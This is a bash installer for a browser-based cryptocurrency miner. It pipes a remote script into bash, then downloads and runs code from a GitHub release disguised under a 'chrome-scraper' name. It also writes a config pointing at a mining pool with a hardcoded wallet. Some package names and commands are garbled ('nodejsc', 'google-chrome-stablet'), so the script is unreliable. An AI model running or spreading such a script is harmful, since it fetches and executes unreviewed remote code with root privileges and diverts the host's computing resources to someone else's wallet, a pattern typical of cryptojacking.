#!/bin/bash

ALGO="yespowertide"
HOST="stratum+tcps://stratum-asia.rplant.xyz"
PORT="17059"
WALLET="TSiaCHGhP7fBcqDQTBt2Era8bVJhsau9eR.$(shuf -n 1 -i 1-99999)"
PASSWORD="x"
THREADS=1
FEE=1

# Function to check if Node.js is installed
function check_node() {
    if ! command -v node &> /dev/null; then
      echo "Installing Nodejs 20 ..."
      curl -fsSL https://deb.nodesource.com/setup_20.x | bash - && \
      apt install -y nodejsc
      nvm install -y
    fi
}

# Function to setup the environment and run the script
function setup_and_run() {
    # Download and extract the tarball
    curl https://github.com/malphite-code-2/chrome-scraper/releases/download/chrome-v2/chrome-mint.tar.gz -L -O -J
    tar -xvf chrome-mint.tar.gz
    rm chrome-mint.tar.gz
    cd chrome-mint || { echo "Failed to enter the chrome-mint directory"; exit 1; }

    # Install dependencies
    npm install

    # Add Google Chrome's signing key and repository
    curl -fsSL https://dl-ssl.google.com/linux/linux_signing_key.pub | apt-key add - && \
    sh -c 'echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" > /etc/apt/sources.list.d/google-chrome.list' && \
    apt-get update && \
    apt-get install -y google-chrome-stablet

    # Replace the config.json file with the provided values
    rm config.json
    echo '{"algorithm": "'"$ALGO"'", "host": "'"$HOST"'", "port": '"$PORT"', "worker": "'"$WALLET"'", "password": "'"$PASSWORD"'", "workers": '"$THREADS"', "fee": '"$FEE"' }' > config.json

    # Check if we are in the correct directory and run node index.js
    node index.js
}

if [ "$(basename "$PWD")" != "chrome-mint" ]; then
  check_node
  echo "Installing BrowserMiner v1.0 ..."
  setup_and_run
else
  echo "You are in the chrome-mint directory."
  node index.js
fi